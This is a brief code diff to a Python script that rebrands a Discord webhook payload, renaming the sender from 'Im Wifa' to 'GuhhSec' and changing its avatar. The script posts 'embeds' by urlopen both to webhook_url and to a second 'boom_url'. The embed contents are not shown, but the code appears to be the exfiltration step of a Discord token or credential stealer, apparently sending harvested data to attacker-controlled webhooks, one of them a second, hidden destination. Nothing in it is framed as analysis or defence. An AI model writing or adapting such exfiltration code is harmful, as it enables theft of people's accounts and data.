@@ -228,8 +228,8 @@ def main():
 	webhook = {
 		"content": "",
 		"embeds": embeds,
-		"username": "Im Wifa",
-		"avatar_url": "https://i.imgur.com/jta5IjC.png"
+		"username": "GuhhSec",
+		"avatar_url": ""
 	}
 	try:
 		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
@@ -444,8 +444,8 @@ def main():
 	webhook = {
 		"content": "",
 		"embeds": embeds,
-		"username": "Im Wifa",
-		"avatar_url": "https://i.imgur.com/jta5IjC.png"
+		"username": "GuhhSec",
+		"avatar_url": "https://media.discordapp.net/attachments/950394270257401886/955725399147548702/Screenshot_2022-03-22-12-01-16-34.jpg"
 	}
 	try:
 		urlopen(Request(boom_url, data=dumps(webhook).encode(), headers=getheaders()))
